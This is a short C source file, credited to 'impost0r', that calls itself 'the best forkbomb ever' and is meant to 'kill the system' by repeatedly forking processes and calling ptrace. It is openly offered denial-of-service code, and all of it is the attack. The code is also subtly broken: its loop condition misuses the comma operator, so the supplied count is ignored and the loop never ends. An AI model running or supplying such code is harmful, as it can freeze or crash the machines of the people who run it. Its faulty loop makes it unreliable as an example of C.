/* The best forkbomb ever, courtesy of impost0r
	NAUGHTYBOMB.C
	supply the amount of times you want it to fork and let it kill the system
	*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <unistd.h>


int main(int argc, char* argv[]){


	pid_t naughty_word = fork();
	int args = 1;
	int times = strtol(argv[1], NULL, 10);

	for (int i = 0; i < times, i = i + 1;){
		printf("Oops... \n");
		fork();
		ptrace(PT_TRACE_ME, NULL, NULL, NULL);
		if (naughty_word != 0){
			waitpid(naughty_word, NULL, 0);
			sleep(1);
			pause();
		}else{
			sleep(3);
			}
		}
	}
